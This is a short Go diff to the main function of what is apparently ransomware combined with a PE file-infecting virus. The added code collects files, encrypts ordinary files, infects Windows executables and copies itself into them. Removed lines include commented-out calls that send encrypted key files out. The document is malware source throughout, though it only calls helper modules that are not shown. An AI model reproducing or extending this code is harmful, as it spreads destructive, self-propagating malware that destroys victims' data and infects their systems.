@@ -1,11 +1,12 @@
 package main
 
 import (
-	"./encrypt"
-	"./fileSystem"
-	"fmt"
 	"os"
 	"strings"
+
+	"./encrypt"
+	"./fileSystem"
+	"./peVirus"
 )
 
 func main() {
@@ -14,17 +15,8 @@ func main() {
 	if !ok {
 		ffname += ".exe"
 	}
-
-	f, _ := os.Open(ffname)
-	getInfo, _ := f.Stat()
-	getLen := getInfo.Size()
-	b := make([]byte, getLen)
-	n, _ := f.Read(b)
-	fmt.Println(n)
-	fmt.Println(b[:100])
-
-	//fileTransfer.sendFile("prikey.enc")
-	//fileTransfer.sendFile("aeskey.enc")
-	filePath := fileSystem.GetAllFile(ffname)
-	encrypt.Run(filePath)
+	othFile, peFile := fileSystem.GetAllFile(ffname)
+	encrypt.Run(othFile)
+	x64File := peVirus.Infect(peFile)
+	peVirus.SelfCopy(x64File, ffname)
 }
